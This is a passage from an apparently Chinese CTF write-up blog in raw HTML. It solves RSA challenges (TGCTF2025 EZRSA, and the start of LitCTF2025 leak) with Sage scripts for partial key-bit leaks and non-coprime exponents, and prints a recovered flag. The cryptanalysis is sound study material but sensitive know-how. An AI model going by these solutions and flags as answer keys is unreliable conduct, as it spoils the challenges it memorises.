mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">1</span><span class="mclose">)</span><span class="mord">%</span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>q</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>≡</mo><mo stretchy="false">(</mo><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mo>+</mo><mi>k</mi><mn>2</mn><mo stretchy="false">)</mo><mi mathvariant="normal">%</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">q&#x27;\equiv(ax+b+k2)\%p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">2</span><span class="mclose">)</span><span class="mord">%</span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>∗</mo><msup><mi>q</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>−</mo><mi>n</mi><mo>≡</mo><mi>a</mi><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mi>b</mi><mo>+</mo><mi>k</mi><mn>2</mn><mo>+</mo><mi>a</mi><mi>k</mi><mn>1</mn><mo stretchy="false">)</mo><mi>x</mi><mo>+</mo><mi>b</mi><mi>k</mi><mn>1</mn><mo>+</mo><mi>k</mi><mn>1</mn><mi>k</mi><mn>2</mn><mo>−</mo><mi>n</mi><mo>≡</mo><mn>0</mn><mi mathvariant="normal">%</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">p&#x27;*q&#x27;-n\equiv ax^{2}+(b+k2+ak1)x+bk1+k1k2-n\equiv0\%p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">1</span><span class="mclose">)</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">1</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.94444em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mord">%</span><span class="mord mathnormal">p</span></span></span></span><br /><code>abpn</code>已知，<code>k1k2</code>是小数可爆破，那就解<code>x</code>的一元二次方程即可</p><p>这里得开多线程搞一手……</p><h2 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> reference</h2><blockquote><p><a href="https://tover.xyz/p/2024-ccb-RandomRSA/">https://tover.xyz/p/2024-ccb-RandomRSA/</a><br /><a href="http://www.andynoel.xyz/?p=904">http://www.andynoel.xyz/?p=904</a><br /><a href="https://blog.csdn.net/Jayjay___/article/details/142059111">https://blog.csdn.net/Jayjay___/article/details/142059111</a></p></blockquote><h1 id="tgctf2025-ezrsa"><a class="markdownIt-Anchor" href="#tgctf2025-ezrsa"></a> TGCTF2025 - EZRSA</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag, get_random_emojiiiiii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genarate_emojiiiiii_prime</span>(<span class="params">nbits, base=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(base // <span class="number">32</span> * <span class="number">32</span>) <span class="keyword">if</span> base &gt;= <span class="number">3</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbits // <span class="number">8</span> // <span class="number">4</span> - base // <span class="number">32</span>):</span><br><span class="line">            p = (p &lt;&lt; <span class="number">32</span>) + get_random_emojiiiiii()  <span class="comment"># 猜一猜</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag.encode(</span><br><span class="line">) + <span class="string">&quot;&quot;</span>.join([long_to_bytes(get_random_emojiiiiii()).decode() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]).encode())</span><br><span class="line">p = genarate_emojiiiiii_prime(<span class="number">512</span>, <span class="number">224</span>)</span><br><span class="line">q = genarate_emojiiiiii_prime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="string">&quot;💯&quot;</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, bytes_to_long(e.encode()), n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p0 =&quot;</span>, long_to_bytes(p % <span class="number">2</span> ** <span class="number">256</span>).decode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"><span class="comment"># p0 = 😘😾😂😋😶😾😳😷</span></span><br><span class="line"><span class="comment"># n = 156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span></span><br><span class="line"><span class="comment"># c = 47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401</span></span><br></pre></td></tr></table></figure><p>可以看到<code>p</code>相当于一个<strong>224位的素数拼接9个emoji符号</strong>而来，而<code>get_random_emojiiiiii()</code>这个函数我们未知</p><p>这里是<strong>p的低位泄露攻击</strong>，我们知道了<strong>p一半的位数</strong>，尝试后我们可以发现<strong>256位</strong>似乎不够我们进行攻击</p><p>(部分情况下，1024位需要知道<strong>576比特位</strong>，512位需要知道<strong>288比特位</strong>，有的又是需要256位再<strong>多一个字节</strong>，d的泄露需要知道至少<strong>1/4的比特位</strong>，视情况而定吧)</p><p>可以看到<code>p</code>的<strong>低8字节</strong>已经给出，而我们还可以再爆破出<strong>高一个字节</strong>，查阅<a href="https://apps.timwhitlock.info/emoji/tables/unicode">emoji符号的范围</a>，我们得到以下脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">e = bytes_to_long(<span class="string">&quot;💯&quot;</span>.encode())</span><br><span class="line">p0 = bytes_to_long(<span class="string">&quot;😘😾😂😋😶😾😳😷&quot;</span>.encode())</span><br><span class="line">n = <span class="number">156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">0xf09f9880</span>,<span class="number">0xf09f998f</span>):</span><br><span class="line">    p00 = i*<span class="number">2</span>^<span class="number">256</span> + p0</span><br><span class="line">    f = x*<span class="number">2</span>^<span class="number">288</span>+p00</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X = <span class="number">2</span>**<span class="number">224</span>,beta=<span class="number">0.4</span>,epsilon=<span class="number">0.02</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:       </span><br><span class="line">        p = <span class="built_in">int</span>(roots[<span class="number">0</span>])*<span class="number">2</span>^<span class="number">288</span> + p00</span><br><span class="line">        q = n // p</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p = &#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;q = &#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>然后就是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mtext>与</mtext><mi>ϕ</mi><mtext>不互素</mtext></mrow><annotation encoding="application/x-tex">e与\phi 不互素</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">与</span><span class="mord mathnormal">ϕ</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">互</span><span class="mord cjk_fallback">素</span></span></span></span>，上板子即可</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.parallel.multiprocessing_sage <span class="keyword">import</span> parallel_iter    <span class="comment"># TODO</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nth_p</span>(<span class="params">y, n, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[LOG] Solving pi = %s^%d&#x27;</span> % (<span class="built_in">hex</span>(p), k))</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    xs = Zmod(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    xs = GF(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  xs = <span class="built_in">list</span>(<span class="built_in">set</span>(xs))</span><br><span class="line">  xs = [Integer(x) <span class="keyword">for</span> x <span class="keyword">in</span> xs]</span><br><span class="line">  <span class="keyword">return</span> xs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_p</span>(<span class="params">c, e, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  P = Integer(<span class="built_in">pow</span>(p, k))</span><br><span class="line">  phi = euler_phi(P)</span><br><span class="line"></span><br><span class="line">  rs = []</span><br><span class="line">  ei = e</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = gcd(phi, ei)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    rs += [r]</span><br><span class="line">    ei //= r</span><br><span class="line">  r = product(rs)</span><br><span class="line">  dr = (e // r).inverse_mod(phi)</span><br><span class="line">  cr = <span class="built_in">pow</span>(c, dr, P)</span><br><span class="line">  <span class="keyword">return</span> nth_p(cr, r, p, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_n</span>(<span class="params">c, e, ps, ks=<span class="literal">None</span>, checker=<span class="literal">None</span>, ret1=<span class="literal">False</span></span>):</span><br><span class="line">  <span class="comment"># ps: p, q, ...</span></span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(ps, <span class="built_in">list</span>)</span><br><span class="line">  <span class="keyword">if</span> ks == <span class="literal">None</span>:</span><br><span class="line">    ks = [<span class="number">1</span>] * <span class="built_in">len</span>(ps)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(ps) == <span class="built_in">len</span>(ks)</span><br><span class="line">  ms = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps)):</span><br><span class="line">    mp = nthRSA_p(c, e, ps[i], ks[i])</span><br><span class="line">    ms += [mp]</span><br><span class="line">  total = product([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[Log] Doing crt.\nComplexity = %d: %s&#x27;</span> % (total, <span class="built_in">str</span>([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])))</span><br><span class="line"></span><br><span class="line">  res = []</span><br><span class="line">  Ps = [ps[i]**ks[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps))]</span><br><span class="line">  <span class="keyword">for</span> msi <span class="keyword">in</span> tqdm(itertools.product(*ms), total=total):</span><br><span class="line">    m = crt(<span class="built_in">list</span>(msi), Ps)</span><br><span class="line">    <span class="keyword">if</span> checker == <span class="literal">None</span>:</span><br><span class="line">      res += [m]</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> checker(m):</span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> ret1:</span><br><span class="line">        res += [m]</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">return</span> m</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genHeaderChecker</span>(<span class="params">hd</span>):</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">str</span>):</span><br><span class="line">    hd = hd.encode()</span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">bytes</span>)</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkHeader</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">      <span class="keyword">if</span> hd <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkHeader</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genStrChecker</span>(<span class="params"><span class="built_in">dict</span>, n=<span class="number">65537</span></span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkStr</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m)).decode()</span><br><span class="line">      <span class="keyword">for</span> fi <span class="keyword">in</span> flag[:n]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> fi <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">      <span class="built_in">print</span>(flag)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkStr</span><br><span class="line"></span><br><span class="line">p = <span class="number">12424840247075830662687097292458444573014198016321428995092662043898159667123240573630892907827505266982898641483333170032514244713840745287869771915696311</span></span><br><span class="line">q = <span class="number">12602471198163266643743702664647336358595911975665358584258749238146841559843060594842063473155049870396568542257767865369797827796765830093256146584311989</span></span><br><span class="line">e = bytes_to_long(<span class="string">&quot;💯&quot;</span>.encode())</span><br><span class="line">n = <span class="number">156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span></span><br><span class="line">c = <span class="number">47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401</span></span><br><span class="line"></span><br><span class="line">ps = [p, q]</span><br><span class="line">checker = genHeaderChecker(<span class="string">&#x27;TGCTF&#x27;</span>)</span><br><span class="line">res = nthRSA_n(c, e, ps, checker=checker)</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">  flag = long_to_bytes(<span class="built_in">int</span>(r))</span><br><span class="line">  <span class="built_in">print</span>(flag.decode())</span><br><span class="line"><span class="comment"># TGCTF&#123;🙇🏮🤟_🫡🫡🫡_🚩🚩🚩&#125;😃😖😘😨😢</span></span><br></pre></td></tr></table></figure><h1 id="litctf2025-leakdp高位泄露广义解法"><a class="markdownIt-Anchor" href="#litctf2025-leakdp高位泄露广义解法"></a> LitCTF2025 - leak(dp高位泄露广义解法)</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p,q,e = getPrime(<span class="number">1024</span>),getPrime(<span class="number">1024</span>),getPrime(<span class="number">101</span>)</span><br><span class="line">n = p*q</span><br><span class="line">temp = gmpy2.invert(e,p-<span class="number">1</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">hint = temp&gt;&gt;<span class="number">180</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hint = <span class="subst">&#123;hint&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">e = 1915595112993511209389477484497</span></span><br><span class="line"><span class="string">n = 12058282950596489853905564906853910576358068658769384729579819801721022283769030646360180235232443948894906791062870193314816321865741998147649422414431603039299616924238070704766273248012723702232534461910351418959616424998310622248291946154911467931964165973880496792299684212854214808779137819098357856373383337861864983040851365040402759759347175336660743115085194245075677724908400670513472707204162448675189436121439485901172477676082718531655089758822272217352755724670977397896215535981617949681898003148122723643223872440304852939317937912373577272644460885574430666002498233608150431820264832747326321450951</span></span><br><span class="line"><span class="string">c = 5408361909232088411927098437148101161537011991636129516591281515719880372902772811801912955227544956928232819204513431590526561344301881618680646725398384396780493500649993257687034790300731922993696656726802653808160527651979428360536351980573727547243033796256983447267916371027899350378727589926205722216229710593828255704443872984334145124355391164297338618851078271620401852146006797653957299047860900048265940437555113706268887718422744645438627302494160620008862694047022773311552492738928266138774813855752781598514642890074854185464896060598268009621985230517465300289580941739719020511078726263797913582399</span></span><br><span class="line"><span class="string">hint = 10818795142327948869191775315599184514916408553660572070587057895748317442312635789407391509205135808872509326739583930473478654752295542349813847128992385262182771143444612586369461112374487380427668276692719788567075889405245844775441364204657098142930</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>∗</mo><mi>d</mi><mi>p</mi><mo>≡</mo><mn>1</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e*dp\equiv 1(mod\ p-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>∗</mo><mo stretchy="false">(</mo><mi>d</mi><mi>p</mi><mi mathvariant="normal">_</mi><mi>h</mi><mi>i</mi><mi>g</mi><mi>h</mi><mo>+</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>k</mi><mo>∗</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">e*(dp\_high+x)=k*(p-1)+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>∗</mo><mo stretchy="false">(</mo><mi>d</mi><mi>p</mi><mi mathvariant="normal">_</mi><mi>h</mi><mi>i</mi><mi>g</mi><mi>h</mi><mo>+</mo><mi>x</mi><mo stretchy="false">)</mo><mo>+</mo><mi>k</mi><mo>−</mo><mn>1</mn><mo>≡</mo><mn>0</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo 